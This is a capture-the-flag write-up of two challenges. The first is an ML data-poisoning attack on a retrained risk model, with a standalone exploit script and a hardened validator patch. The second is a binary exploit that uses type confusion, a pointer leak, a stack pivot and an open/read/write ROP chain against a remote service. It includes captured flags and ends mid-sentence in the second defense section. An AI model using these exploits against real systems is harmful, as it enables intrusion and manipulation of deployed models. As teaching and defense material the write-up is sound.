## AI and ML Security

### ColdChain Drift

| | |
|---|---|
| **Points** | 5 (Attack) + 5 (Defense) |
| **Target** | `https://eci-2zei3oczjahy1rzlbnp4.cloudeci1.ichunqiu.com:5000/` (ephemeral AWD container) |
| **Flag** | `flag{a08d64b8-454f-4cc1-af2b-12917e960d86}` |


#### Overview

A cold-chain logistics platform runs a container **risk-verification** service. On every upload it:

1. Reads a fixed-schema CSV of cold-chain sensor samples.
2. **Retrains** a logistic-regression-style risk model on the uploaded rows.
3. Re-scores one specific locked container, **`CC-7319`** (CSV row 262).

The target's original label is `high_risk`, and its baseline retrained score is **`0.549645`**, just above the decision threshold **`0.5`**.

- **Attack goal:** Upload a modified CSV that, *without touching the target row or any label*, poisons the *other* training samples so the retrained model scores `CC-7319` **below 0.5** (`normal`). Success returns the flag.
- **Defense goal:** Submit a patch (`*.tar.gz`) that hardens `/app/validator.py` so this poisoning is rejected, while keeping the service functional. `update.sh` may only use `mv`, `cp`, `chmod`.

##### Constraints enforced by the service
- Row count, `container_id` set, and every `is_high_risk` label must be unchanged.
- The full `CC-7319` row must be byte-for-byte identical.
- Every feature value must stay within its business range.
- Distribution drift must pass: **per-feature mean/std drift ≤ 0.05**, **per-cell drift ≤ 0.18** (both normalized by the feature's business range).


#### Recon

Uploading the **unmodified** dataset returns a JSON response that leaks the retrained **model weights** and the exact **risk score**:

```text
{
  "risk_score": 0.549645,
  "threshold": 0.5,
  "label": "high_risk",
  "success": false,
  "model_weights": {
    "avg_temp_deviation": 3.335129, "temperature_std": 3.220546,
    "over_temp_minutes": 3.11065,  "door_open_count": 2.621699,
    "vibration_score": 2.708024,   "battery_health": -3.18871,
    "route_deviation_km": 2.73425, "sensor_packet_loss_rate": 2.988667
  },
  "drift": { ... all zeros ... },
  "validation": ["row count ok","ids unchanged","labels unchanged",
                 "target row locked","feature drift ok"]
}
```

Key observations:

- It is a **binary logistic model** over 8 features, all with sizeable weights (~±3). Seven features have **positive** weight (higher ⇒ more risky); **`battery_health`** has **negative** weight (higher ⇒ safer).
- The model is **retrained from scratch on the uploaded data every request**. That is the whole attack surface.
- The score `0.549645` sits only `+0.049645` above the threshold.

##### The dataset

520 data rows, 8 numeric features + `container_id` + `is_high_risk`. Class balance: 168 high-risk / 352 normal (~32%). Target row:

```
CC-7319, 2.3843, 1.5444, 57, 6, 0.2854, 0.7512, 5.1026, 0.0462, 1
```

Computing the target's standardized position (z-score using column mean/std) shows it sits **above** the mean on all seven positive-weight features and **below** the mean on `battery_health`:

| feature | target z |
|---|---|
| avg_temp_deviation | +0.431 |
| temperature_std | +0.361 |
| over_temp_minutes | +0.299 |
| door_open_count | +0.020 |
| vibration_score | +0.372 |
| battery_health | **−0.419** |
| route_deviation_km | +0.342 |
| sensor_packet_loss_rate | +0.270 |

This is precisely what makes it read as "risky."


#### The vulnerability: training-data poisoning via distribution shift

The target row is locked, but the model **normalizes/scales each feature using the whole column** and **retrains** on the attacker-controlled rows. So even without touching `CC-7319`, an attacker can move:

1. **The normalization statistics** (column mean/std / min-max), which shift the target's *standardized* position, and
2. **The learned decision boundary** itself.

Since the target sits only marginally above threshold and only ~0.049 needs to be shaved off, a **coordinated, distribution-wide nudge** is enough.

##### Direction of the attack
To lower the target's score `sigmoid(w·z + b)`:

- For each **positive-weight** feature: **raise** the column (shift the other rows up). The mean moves toward/past the target, shrinking the target's positive z → less "risky" contribution.
- For **`battery_health`** (negative weight): **lower** the column. The target's z becomes more positive → `w·z` more negative → less risky.

Each shift stays small (well under the `0.18` per-cell and `0.05` per-feature limits), but because it is applied to **all 8 features simultaneously across all 519 non-target rows**, the combined effect easily crosses the threshold.

##### Recovering the exact pipeline (from the leaked source)

The success response also grants a temporary source archive:

```
/__source/<token>/source.tar.gz    (valid ~600s)
```

`model.py` confirms the mechanics. Features are **min-max scaled to [0,1]** using fixed business ranges, then a hand-rolled full-batch gradient-descent logistic regression is trained (2600 iters, lr 0.45, L2 0.002, class-balanced sample weights). Reproducing it locally matches the server exactly:

```
baseline score: 0.549645   (server: 0.549645)  ✓
```


#### Exploitation

Rather than solve the constrained optimization analytically, a single well-chosen coordinated shift is enough. Shift every non-target row by `0.2 · σ` (per-feature standard deviation) in the helpful direction, clamped to the business range and rounded to integers where the column is integral (`over_temp_minutes`, `door_open_count`):

```python
import csv, numpy as np

rows = list(csv.reader(open('dataset.csv'))); hdr = rows[0]; data = rows[1:]
feats = ['avg_temp_deviation','temperature_std','over_temp_minutes','door_open_count',
         'vibration_score','battery_health','route_deviation_km','sensor_packet_loss_rate']
idx  = {f: hdr.index(f) for f in feats}
X    = np.array([[float(r[idx[f]]) for f in feats] for r in data])
sd   = X.std(0)

sign = {f: 1 for f in feats}; sign['battery_health'] = -1     # raise risky feats, lower battery
c = 0.2                                                       # step, in units of sigma
int_cols  = {'over_temp_minutes', 'door_open_count'}
clamp01   = {'vibration_score','battery_health'}              # ranges are [0,1]

out = [hdr]
for r in data:
    r = r[:]
    if r[0] != 'CC-7319':                                     # never touch the target row
        for j, f in enumerate(feats):
            v = float(r[idx[f]]) + sign[f] * c * sd[j]
            v = max(v, 0.0)
            if f in clamp01: v = min(v, 1.0)
            r[idx[f]] = str(int(round(v))) if f in int_cols else f"{v:.4f}"
    out.append(r)
csv.writer(open('multi.csv','w',newline='')).writerows(out)
```

Upload:

```bash
curl -sk -X POST -F "file=@multi.csv" https://<instance>:5000/upload
```

Response:

```text
{
  "success": true,
  "label": "normal",
  "risk_score": 0.378704,
  "flag": "flag{a08d64b8-454f-4cc1-af2b-12917e960d86}",
  "source": "/__source/IG8oN_ZFJUug0hd4S0EHyDkwSJzZ1GBrrSRXtcFRU-4/source.tar.gz",
  "drift": {
    "avg_temp_deviation":      {"mean": 0.032770, ...},
    "battery_health":          {"mean": 0.025551, ...},
    "door_open_count":         {"mean": 0.033269, ...},
    "over_temp_minutes":       {"mean": 0.029111, ...},
    "route_deviation_km":      {"mean": 0.027036, ...},
    "sensor_packet_loss_rate": {"mean": 0.026748, ...},
    "temperature_std":         {"mean": 0.030781, ...},
    "vibration_score":         {"mean": 0.027747, ...}
  }
}
```

Score dropped **`0.549645 → 0.378704`**. Every per-feature drift (about 0.026 to 0.033) stays under `0.05`, per-cell under `0.18`, and the target row and labels are untouched, so all validation passes. **Flag captured.**

> Why it works: each feature contributes only ~0.03 mean drift, but eight coordinated contributions push the retrained boundary far past the `0.049` margin the defender left on the target.

##### Full exploit script (`exploit.py`)

Self-contained, standard-library only (no `numpy`/`requests`). It downloads the dataset, builds the poison CSV (locking the target row), uploads it, and prints the flag:

```bash
python3 exploit.py https://<host>:5000
# optional: --step 0.2 (shift per feature in units of column sigma), --out multi.csv
```

```python
#!/usr/bin/env python3
"""ColdChain Drift exploit — coordinated distribution-shift data poisoning."""
import argparse, csv, io, json, math, ssl, sys, urllib.request

FEATURES = ["avg_temp_deviation","temperature_std","over_temp_minutes","door_open_count",
            "vibration_score","battery_health","route_deviation_km","sensor_packet_loss_rate"]
SIGN = {f: 1 for f in FEATURES}; SIGN["battery_health"] = -1   # raise risky feats, lower battery
RANGES = {"avg_temp_deviation":(0.0,6.0),"temperature_std":(0.0,5.0),"over_temp_minutes":(0.0,240.0),
          "door_open_count":(0.0,30.0),"vibration_score":(0.0,1.0),"battery_health":(0.0,1.0),
          "route_deviation_km":(0.0,25.0),"sensor_packet_loss_rate":(0.0,0.25)}
INT_COLS = {"over_temp_minutes","door_open_count"}; TARGET_ID = "CC-7319"

_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE

def http_get(url):
    with urllib.request.urlopen(urllib.request.Request(url), context=_CTX, timeout=60) as r:
        return r.read()

def http_post_csv(url, csv_bytes):
    b = "----coldchainexploit"
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"poison.csv\"\r\n"
            "Content-Type: text/csv\r\n\r\n").encode() + csv_bytes + f"\r\n--{b}--\r\n".encode()
    req = urllib.request.Request(url, data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={b}"}, method="POST")
    with urllib.request.urlopen(req, context=_CTX, timeout=120) as r:
        return json.loads(r.read())

def pstdev(vals):
    n = len(vals); m = sum(vals)/n
    return math.sqrt(sum((v-m)**2 for v in vals)/n)

def build_poison_csv(original_csv_bytes, step):
    rows = list(csv.reader(io.StringIO(original_csv_bytes.decode("utf-8-sig"))))
    header, data = rows[0], rows[1:]
    idx = {f: header.index(f) for f in FEATURES}
    sd  = {f: pstdev([float(r[idx[f]]) for r in data]) for f in FEATURES}
    out = [header]
    for r in data:
        r = r[:]
        if r[0] != TARGET_ID:                                  # never touch the locked target row
            for f in FEATURES:
                low, high = RANGES[f]
                v = min(max(float(r[idx[f]]) + SIGN[f]*step*sd[f], low), high)
                r[idx[f]] = str(int(round(v))) if f in INT_COLS else f"{v:.4f}"
        out.append(r)
    buf = io.StringIO(); csv.writer(buf).writerows(out); return buf.getvalue().encode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base_url"); ap.add_argument("--step", type=float, default=0.2)
    ap.add_argument("--out", default="multi.csv")
    a = ap.parse_args(); base = a.base_url.rstrip("/")
    original = http_get(f"{base}/dataset")
    poison = build_poison_csv(original, a.step)
    open(a.out, "wb").write(poison)
    resp = http_post_csv(f"{base}/upload", poison)
    print("risk_score =", resp.get("risk_score"), "label =", resp.get("label"))
    if resp.get("success"):
        print("[+] FLAG:", resp.get("flag")); print("[+] source:", resp.get("source")); return 0
    print("[-] failed:", resp.get("message"), "— try a larger --step"); return 1

if __name__ == "__main__":
    sys.exit(main())
```

Verified against the locally reproduced server model: the builder locks the target row and drives the retrained score `0.549645 → 0.378704` (< 0.5). The full copy lives at `exploit.py` in this directory.


#### Defense

##### What the original `validator.py` checks (and misses)

- ✅ schema, row count, id set, labels, target row locked
- ✅ per-cell drift ≤ `0.18`
- ✅ per-feature mean drift ≤ `0.05` **and** per-feature std drift ≤ `0.05`
- ❌ **no bound on the *aggregate* shift across features**, and
- ❌ **no check that the retrained target hasn't been flipped**

The attack lives entirely inside the per-feature tolerances (each feature moves about 0.03, under 0.05), so the independent per-feature checks never fire.

##### Fix strategy

Patch `/app/validator.py` with **two layers of defense-in-depth**, without modifying the model, dataset, flags, or platform scripts, and without rejecting legitimate uploads:

**Layer 1: aggregate directional-drift cap.**
Legitimate corrections touch a handful of rows and barely move the global statistics. A poisoning attack shifts *every* non-target row across *many* features at once. Bounding the **sum** of per-feature mean drift catches exactly that accumulation:

```python
MAX_TOTAL_MEAN_DRIFT = 0.06
...
if total_mean_drift > MAX_TOTAL_MEAN_DRIFT:
    raise ValueError("多特征整体分布漂移超过阈值")
```

The attack's total mean drift ≈ `0.23`, far over `0.06`, so it is rejected, while a benign edit of a few rows stays near zero.

**Layer 2: anti-poisoning retrain guard (primary, technique-agnostic).**
Any *successful* poisoning, no matter how it's crafted (mean shift, std manipulation, adversarial rows, and so on), must by definition drive the retrained target below the threshold. So retrain on the uploaded data and reject if the locked target flips:

```python
poisoned_score, _ = train_and_score(uploaded_rows)
if poisoned_score < TARGET_THRESHOLD:
    raise ValueError("检测到训练数据投毒：目标冷柜风险被异常压低")
```

This is the reliable backstop: it does **not** enumerate attack patterns, it checks the invariant the attacker is trying to break. Benign uploads (including the untouched dataset) keep the target high-risk and pass unchanged, so it is *not* "rejecting all uploads."

##### Full hardened `validator.py`

Only three edits are made to the original file. The `import` line gains `TARGET_THRESHOLD` and `train_and_score`, a module constant `MAX_TOTAL_MEAN_DRIFT` is added, and both guards are inserted at the end of `validate_upload` just before it returns. Everything else (schema parsing, id/label/target-row checks, per-cell and per-feature drift) is unchanged.

```python
import csv
import io
import statistics

from model import FEATURES, TARGET_ID, TARGET_THRESHOLD, train_and_score

# Defense-in-depth against training-data poisoning.
# A tighter cap on the aggregate directional distribution shift across all
# features. Legitimate corrections touch a handful of rows and barely move the
# global mean/std; a poisoning attack coordinates a shift on every non-target
# row across many features at once, which accumulates here.
MAX_TOTAL_MEAN_DRIFT = 0.06


ID_COLUMN = "container_id"
LABEL_COLUMN = "is_high_risk"
ALL_COLUMNS = [ID_COLUMN] + [name for name, _, _ in FEATURES] + [LABEL_COLUMN]
DRIFT_TOLERANCE = 0.05
MAX_CELL_DRIFT = 0.18


def _format_number(value, digits=6):
    text = f"{float(value):.{digits}f}"
    return text.rstrip("0").rstrip(".") if "." in text else text


def read_csv_bytes(raw_bytes):
    text = raw_bytes.decode("utf-8-sig")
    reader = csv.DictReader(io.StringIO(text))
    if reader.fieldnames != ALL_COLUMNS:
        raise ValueError("CSV 字段不匹配")

    rows = []
    seen_ids = set()
    for row_index, raw_row in enumerate(reader, start=2):
        container_id = str(raw_row.get(ID_COLUMN, "")).strip()
        if not container_id:
            raise ValueError(f"第 {row_index} 行缺少 container_id")
        if container_id in seen_ids:
            raise ValueError(f"container_id 重复: {container_id}")
        seen_ids.add(container_id)

        parsed = {ID_COLUMN: container_id}
        for name, low, high in FEATURES:
            try:
                value = float(str(raw_row.get(name, "")).strip())
            except ValueError as exc:
                raise ValueError(f"{container_id} 的 {name} 不是合法数字") from exc
            if value < low or value > high:
                raise ValueError(f"{container_id} 的 {name} 超出业务范围")
            parsed[name] = value

        label_text = str(raw_row.get(LABEL_COLUMN, "")).strip()
        if label_text not in {"0", "1"}:
            raise ValueError(f"{container_id} 的 is_high_risk 不是 0/1")
        parsed[LABEL_COLUMN] = int(label_text)
        rows.append(parsed)

    return rows


def rows_to_csv(rows):
    out = io.StringIO()
    writer = csv.DictWriter(out, fieldnames=ALL_COLUMNS, lineterminator="\n")
    writer.writeheader()
    for row in rows:
        item = {ID_COLUMN: row[ID_COLUMN], LABEL_COLUMN: int(row[LABEL_COLUMN])}
        for name, _, _ in FEATURES:
            item[name] = _format_number(row[name], digits=6)
        writer.writerow(item)
    return out.getvalue().encode("utf-8")


def index_by_id(rows):
    return {row[ID_COLUMN]: row for row in rows}


def _feature_values(rows, feature_name):
    return [float(row[feature_name]) for row in rows]


def _target_row_equal(original, uploaded):
    for column in ALL_COLUMNS:
        if column in {ID_COLUMN, LABEL_COLUMN}:
            if str(original[column]) != str(uploaded[column]):
                return False
        elif abs(float(original[column]) - float(uploaded[column])) > 1e-9:
            return False
    return True


def validate_upload(original_rows, uploaded_rows):
    messages = []
    if len(uploaded_rows) != len(original_rows):
        raise ValueError("CSV 行数发生变化")

    original_by_id = index_by_id(original_rows)
    uploaded_by_id = index_by_id(uploaded_rows)
    if set(original_by_id) != set(uploaded_by_id):
        raise ValueError("container_id 集合发生变化")
    if TARGET_ID not in uploaded_by_id:
        raise ValueError("目标冷柜缺失")

    target_original = original_by_id[TARGET_ID]
    target_uploaded = uploaded_by_id[TARGET_ID]
    if not _target_row_equal(target_original, target_uploaded):
        raise ValueError("目标冷柜行不允许修改")

    for container_id, original in original_by_id.items():
        uploaded = uploaded_by_id[container_id]
        if int(original[LABEL_COLUMN]) != int(uploaded[LABEL_COLUMN]):
            raise ValueError(f"{container_id} 的标签被修改")

        if container_id == TARGET_ID:
            continue

        max_cell_drift = 0.0
        for name, low, high in FEATURES:
            feature_range = high - low
            drift = abs(float(uploaded[name]) - float(original[name])) / feature_range
            max_cell_drift = max(max_cell_drift, drift)
        if max_cell_drift > MAX_CELL_DRIFT:
            raise ValueError(f"{container_id} 的单字段变化过大")

    drift_report = {}
    total_mean_drift = 0.0
    for name, low, high in FEATURES:
        feature_range = high - low
        old_values = _feature_values(original_rows, name)
        new_values = _feature_values(uploaded_rows, name)
        mean_drift = abs(statistics.mean(new_values) - statistics.mean(old_values)) / feature_range
        std_drift = abs(statistics.pstdev(new_values) - statistics.pstdev(old_values)) / feature_range
        total_mean_drift += mean_drift
        drift_report[name] = {
            "mean": round(mean_drift, 6),
            "std": round(std_drift, 6),
            "max": round(max(mean_drift, std_drift), 6),
        }
        if mean_drift > DRIFT_TOLERANCE or std_drift > DRIFT_TOLERANCE:
            raise ValueError(f"{name} 分布漂移超过阈值")

    # Reject a coordinated multi-feature shift whose per-feature drifts each stay
    # under the single-feature tolerance but jointly move the distribution.
    if total_mean_drift > MAX_TOTAL_MEAN_DRIFT:
        raise ValueError("多特征整体分布漂移超过阈值")

    # Primary guard: retrain on the uploaded data and confirm the locked target
    # container is still assessed as high risk. Any poisoning strategy that
    # succeeds must drive the target's retrained score below the threshold, so
    # this rejects the attack regardless of how the feature values were crafted.
    # Benign uploads (including the untouched dataset) keep the target high risk
    # and pass unchanged.
    poisoned_score, _ = train_and_score(uploaded_rows)
    if poisoned_score < TARGET_THRESHOLD:
        raise ValueError("检测到训练数据投毒：目标冷柜风险被异常压低")

    messages.append("row count ok")
    messages.append("ids unchanged")
    messages.append("labels unchanged")
    messages.append("target row locked")
    messages.append("feature drift ok")
    return {"messages": messages, "drift": drift_report}
```

##### Patch package

`update.sh` uses only allowed commands (`cp`, `chmod`); the platform auto-restarts the service afterward:

```sh
#!/bin/sh
cp validator.py /app/validator.py
chmod 644 /app/validator.py
```

Packaged as `patch_coldchain.tar.gz`:

```
update.sh
validator.py   (hardened)
```

Build the tarball from a directory holding the hardened `validator.py` and the `update.sh` above:

```bash
chmod +x update.sh
tar czf patch_coldchain.tar.gz update.sh validator.py
```

The rules allow only `mv`, `cp`, and `chmod` inside `update.sh`. Confirm nothing else slipped in before submitting:

```bash
grep -viE '^\s*#|^\s*$' update.sh | awk '{print $1}' | sort -u
# expected: only cp and chmod
```

Submit `patch_coldchain.tar.gz` on the **防禦 (Defense)** button for ColdChain Drift, then click **申請 check** so the platform validates it.

##### Verification

Simulating the full `/upload` flow with the patch installed via `update.sh`:

| Upload | Result |
|---|---|
| Original dataset (SLA / functionality) | ✅ 200 OK, `success=false`, score `0.549645` unchanged |
| Benign small edit (5 rows) | ✅ Accepted, target stays high-risk |
| Attack PoC (`multi.csv`) | ⛔ 400, rejected by aggregate-drift cap |
| Attack PoC, cap disabled | ⛔ 400, still rejected by the retrain guard alone |

Both layers independently block the exploit; benign traffic is unaffected. Neither the model, dataset, flags, nor platform scripts are touched.


#### Takeaways

- **Retraining on untrusted input is the attack surface.** If the model is rebuilt from user-supplied data every request, "the target row is locked" is *not* enough. Normalization statistics and the decision boundary are global and fully attacker-influenced.
- **Per-feature guardrails compose poorly.** Eight independent "≤ 0.05" checks silently permit a combined shift far larger than any single one. Always bound the *aggregate*.
- **Leaving a thin margin is fragile.** A target sitting `+0.049` above threshold is trivially pushed over by distribution-wide micro-nudges.
- **Defend the invariant, not the pattern.** The retrain guard rejects *any* poisoning by re-checking the property the attacker must violate, instead of trying to blocklist specific tampering shapes.


#### Appendix: files

| File | Purpose |
|---|---|
| `exploit.py` | Standalone attack script (stdlib only) |
| `dataset.csv` | Original dataset (`GET /dataset`) |
| `multi.csv` | Winning attack CSV (produced by `exploit.py`) |
| `src/` | Leaked source (`app.py`, `model.py`, `validator.py`, `coldchain_training.csv`, template) |
| `patch_build/validator.py` | Hardened validator |
| `patch_build/update.sh` | Patch installer (`cp`/`chmod` only) |
| `patch_coldchain.tar.gz` | Defense patch to submit |

---

## Binary Exploitation

### VaultKeeper

| | |
|---|---|
| **Difficulty** | Medium |
| **Points** | 5 |
| **Remote** | `nc 47.95.207.40 30723` |
| **Binary path on server** | `/app/vaultkeeper` |

VaultKeeper is a command-line credential vault. Players interact with *text
vaults* and *key vaults*, then abuse flawed **clone** / **export** semantics to
leak pointers and build an **ORW** (open/read/write) ROP chain under `seccomp`.

#### Recon

```
$ file vaultkeeper
ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[...],
for GNU/Linux 3.2.0, with debug_info, not stripped

$ pwn checksec vaultkeeper
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Full mitigations (Full RELRO, canary, NX, PIE) and it links `libseccomp.so.2`.
The binary keeps debug info and is not stripped, which makes reversing easy.

The symbol table also exports a set of deliberately planted ROP gadgets, kept
alive by a `keep_gadgets` function:

```
g_pop_rax      11f9:  58 c3              pop rax ; ret
g_pop_rdi      11fe:  5f c3              pop rdi ; ret
g_pop_rsi      1203:  5e c3              pop rsi ; ret
g_pop_rdx      1208:  5a c3              pop rdx ; ret
g_mov_rdi_rax  120d:  48 89 c7 c3        mov rdi, rax ; ret
g_syscall      1214:  0f 05 c3           syscall ; ret
g_pivot_keybox 121a:  48 8d 67 08 c3     lea rsp, [rdi+8] ; ret
```

That gadget set (the `pop`s, a raw `syscall`, and a stack pivot off `rdi`) points
at the intended path: pivot onto an attacker-controlled structure and run a
syscall ROP chain. No libc is needed; everything comes from the PIE image.

##### 1.1 The seccomp sandbox

`install_sandbox()` builds a filter with default action `SCMP_ACT_KILL`
(`0x80000000`) and whitelists these syscalls with `SCMP_ACT_ALLOW`:

| nr      | syscall     |
|---------|-------------|
| `0`     | read        |
| `1`     | write       |
| `2`     | open        |
| `0x101` | openat      |
| `3`     | close       |
| `0x3c`  | exit        |
| `0xe7`  | exit_group  |

No `execve`, no `mmap`/`mprotect`, no `fork`. Classic **ORW**: the flag must be
`open`ed, `read` into memory, and `write`n to stdout.

#### Data structures

##### Vault table

`vaults` is a global array of **8** entries, stride `0x28` bytes:

```c
struct Vault {           // 0x28 bytes
    int      used;       // +0x00  slot in use (find_free_slot checks this)
    int      type;       // +0x04  1 = text, 2 = key
    uint64_t size;       // +0x08  capacity / dump length
    char     label[16];  // +0x10
    void    *ptr;        // +0x20  -> text buffer (0x201) or KeyBox (0x218)
};
```

Text buffers come from a `text_pool` (8 × `0x201`), key boxes from a `key_pool`
(8 × `0x218`).

##### KeyBox

```c
struct KeyBox {          // 0x218 bytes
    void (*view)(KeyBox*); // +0x00  fn ptr, set to default_key_view
    KeyBox  *self;         // +0x08  points to itself
    uint64_t key_id;       // +0x10  incrementing counter
    char     material[0x20]; // +0x18  user-controlled (read_exact 0x20)
    char     note[...];      // +0x38  user-controlled (read_exact 0x4f)
};
```

The first field is a function pointer that is later called.

##### Menu

```
1. create text vault      5. clone vault
2. create key vault       6. export key as text   (convert_vault)
3. show vault             7. list vaults
4. edit vault             8. quit
```

#### The vulnerabilities

Two flawed operations combine to give a full exploit.

##### 3.1 `clone_vault`: shallow copy and pointer aliasing

`clone_vault` copies **all 0x28 bytes** of the source `Vault` entry into a fresh
slot, *including the `ptr` field*:

```
mov r8,  [src + 0x20]      ; ptr
mov [dst + 0x20], r8       ; <-- same pointer copied verbatim
```

Now two table entries reference the same underlying buffer or KeyBox. There is no
deep copy; the two entries are aliased.

##### 3.2 `convert_vault`: type confusion ("export key as text")

`convert_vault` ("export key as text") only allows key vaults (type 2) and
"converts" one to text **in place** by simply flipping the type field:

```c
if (v->type != 2) { puts("only key vaults can be exported"); return; }
if (read_num() != 1) { puts("unsupported conversion"); return; }
v->type = 1;                 // <-- that's the entire "conversion"
puts("converted in-place");
```

It does **not** allocate a new text buffer, does **not** copy `material` out, and
does **not** touch `size` (still `0x218`) or `ptr` (still points at the KeyBox).

After this, the same memory is a **KeyBox** but the program treats it as a
**text vault**:

- `show_vault` (text branch) does `write_all(1, v->ptr, v->size)`, which dumps
  the entire 0x218-byte KeyBox to stdout.
- `edit_vault` (text branch) does `read_exact(v->ptr, len)` for `len <= v->size`
  (up to `0x218`). That is an arbitrary overwrite of the whole KeyBox, starting
  at offset 0, the `view` function pointer.

##### 3.3 Putting the primitives together

We need the target usable as text (to leak and write) and as key (so its `view`
pointer gets called) at the same time. `convert` works in place, so we can't have
both on one entry unless we clone first:

```
create key   -> index 0   (KeyBox K, view = default_key_view)
clone 0      -> index 1   (type 2, ptr = K)          # aliased
convert 1    -> type 1    (text, ptr = K, size 0x218) # now index1 == text view of K
```

- **index 0** is still a *key* vault pointing at `K`.
- **index 1** is a *text* vault pointing at the same `K`.

#### Exploitation

##### 4.1 Info leak to defeat PIE

`show` on index 1 (text) dumps all `0x218` bytes of `K`:

```
K[0x00] = default_key_view   ->  PIE base = leak - 0x1d1a
K[0x08] = self               ->  runtime address of the KeyBox
```

The dump gives two leaks: the PIE base (from the `view` pointer) and the absolute
address of `K` (from the `self` pointer). We need the second one because the ROP
chain and the `/flag` string live inside `K`.

> Implementation note: read the dump with `recvn(0x218)`, **not** `recv(0x218)`.
> `recv` may return fewer bytes; the leftover binary then desyncs the next menu
> read.

##### 4.2 Control-flow hijack via the KeyBox `view` pointer

`show_vault` on a **key** vault does:

```c
KeyBox *b = v->ptr;
void (*fn)(KeyBox*) = *(void**)b;   // b[0]
fn(b);                              // rdi = b ; call b[0]
```

So if we can set `b[0]` to `g_pivot_keybox` (`lea rsp, [rdi+8] ; ret`), then
calling `view` with `rdi = b` pivots the stack to `b+8` and returns into whatever
we placed there.

We *can* set `b[0]`: `edit` on index 1 (text view of `K`) writes to `K+0`.

Plan:

1. `edit` index 1 (text), length `0x218`, payload = a fully crafted KeyBox:
   - `K[0]`   = `g_pivot_keybox`
   - `K[8..]` = the ORW ROP chain (executed right after the pivot's `ret`)
   - `/flag\0` placed at a fixed offset inside `K`
2. `show` index 0 (still a key vault): it sets `rdi = K` and does `call K[0]`,
   which runs `lea rsp,[K+8]; ret`, and the chain executes.

##### 4.3 The ORW ROP chain

All gadgets are in the PIE image; only syscalls in the whitelist are used:

```asm
; open("/flag", 0)
pop rdi ; K + PATH_OFF        ; path
pop rsi ; 0                   ; O_RDONLY
pop rax ; 2                   ; SYS_open
syscall
; read(fd, buf, 0x100)
mov rdi, rax                  ; fd from open
pop rsi ; K + BUF_OFF
pop rdx ; 0x100
pop rax ; 0                   ; SYS_read
syscall
; write(1, buf, 0x100)
pop rdi ; 1
pop rsi ; K + BUF_OFF
pop rdx ; 0x100
pop rax ; 1                   ; SYS_write
syscall
; exit(0)
pop rax ; 0x3c
syscall
```

After `open`, the returned `fd` is moved into `rdi` with the `mov rdi, rax ; ret`
gadget. The chain is about 216 bytes and fits in the 0x218-byte KeyBox, with the
`/flag` string and read buffer at higher offsets.

##### 4.4 Full exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
exe = './vaultkeeper'
context.binary = ELF(exe, checksec=False)
HOST, PORT = "47.95.207.40", 30723

# planted gadget offsets (PIE)
G_POP_RAX     = 0x11f9
G_POP_RDI     = 0x11fe
G_POP_RSI     = 0x1203
G_POP_RDX     = 0x1208
G_MOV_RDI_RAX = 0x120d
G_SYSCALL     = 0x1214
G_PIVOT       = 0x121a
DEFAULT_VIEW  = 0x1d1a

io = remote(HOST, PORT) if args.REMOTE else process(exe)

def menu(c):
    io.recvuntil(b"> "); io.sendline(str(c).encode())

def create_key(name, material, note):
    menu(2)
    io.recvuntil(b"name (15 chars): ");     io.sendline(name)
    io.recvuntil(b"material (32 bytes): ");  io.send(material.ljust(0x20, b"\0")[:0x20])
    io.recvuntil(b"note (79 bytes): ");      io.send(note.ljust(0x4f, b"\0")[:0x4f])

def clone(src):
    menu(5); io.recvuntil(b"source index: "); io.sendline(str(src).encode())

def export(idx):
    menu(6)
    io.recvuntil(b"index: ");                 io.sendline(str(idx).encode())
    io.recvuntil(b"target type (1=text): ");  io.sendline(b"1")

def show(idx):
    menu(3); io.recvuntil(b"index: "); io.sendline(str(idx).encode())

def edit_text(idx, length, data):
    menu(4)
    io.recvuntil(b"index: ");   io.sendline(str(idx).encode())
    io.recvuntil(b"length: ");  io.sendline(str(length).encode())
    io.recvuntil(b"data: ");    io.send(data)

# 1) key(0) -> clone(1) -> convert(1) to text (aliased type confusion)
create_key(b"A", b"M"*0x20, b"N")
clone(0)
export(1)

# 2) leak: dump the KeyBox through the text view of index 1
show(1)
io.recvuntil(b"text dump:\n")
dump  = io.recvn(0x218)
view  = u64(dump[0:8]);  kbox = u64(dump[8:16])
base  = view - DEFAULT_VIEW
log.success("PIE base = %#x  KeyBox = %#x", base, kbox)
g = lambda off: base + off

# 3) build ROP + KeyBox payload
PATH_OFF, BUF_OFF = 0x190, 0x1d0
path_addr, buf_addr = kbox + PATH_OFF, kbox + BUF_OFF

rop  = b""
rop += p64(g(G_POP_RDI)) + p64(path_addr)          # open("/flag", 0)
rop += p64(g(G_POP_RSI)) + p64(0)
rop += p64(g(G_POP_RAX)) + p64(2)
rop += p64(g(G_SYSCALL))
rop += p64(g(G_MOV_RDI_RAX))                        # read(fd, buf, 0x100)
rop += p64(g(G_POP_RSI)) + p64(buf_addr)
rop += p64(g(G_POP_RDX)) + p64(0x100)
rop += p64(g(G_POP_RAX)) + p64(0)
rop += p64(g(G_SYSCALL))
rop += p64(g(G_POP_RDI)) + p64(1)                  # write(1, buf, 0x100)
rop += p64(g(G_POP_RSI)) + p64(buf_addr)
rop += p64(g(G_POP_RDX)) + p64(0x100)
rop += p64(g(G_POP_RAX)) + p64(1)
rop += p64(g(G_SYSCALL))
rop += p64(g(G_POP_RAX)) + p64(0x3c)               # exit(0)
rop += p64(g(G_SYSCALL))

payload = bytearray(b"\0" * 0x218)
payload[0:8]                 = p64(g(G_PIVOT))      # view ptr -> stack pivot
payload[8:8+len(rop)]        = rop                  # chain runs after pivot ret
payload[PATH_OFF:PATH_OFF+6] = b"/flag\0"
assert 8 + len(rop) <= PATH_OFF

# 4) overwrite KeyBox via text edit, then trigger via key show
edit_text(1, 0x218, bytes(payload))
show(0)                                             # rdi=K ; call K[0] -> pivot -> ROP

io.interactive()
```

Run:

```
$ python3 exploit.py REMOTE
[+] PIE base = 0x563806012000
FLAGOUT:flag{b93ebd6d-d6ba-4234-a060-4e41cfde7804}
```

- **Flag:** `flag{b93ebd6d-d6ba-4234-a060-4e41cfde7804}`

#### Defense

AWDT requires patching `/app/vaultkeeper` and submitting a `.tar.gz`. After
`update.sh` runs, the service restarts. Only these commands are whitelisted in
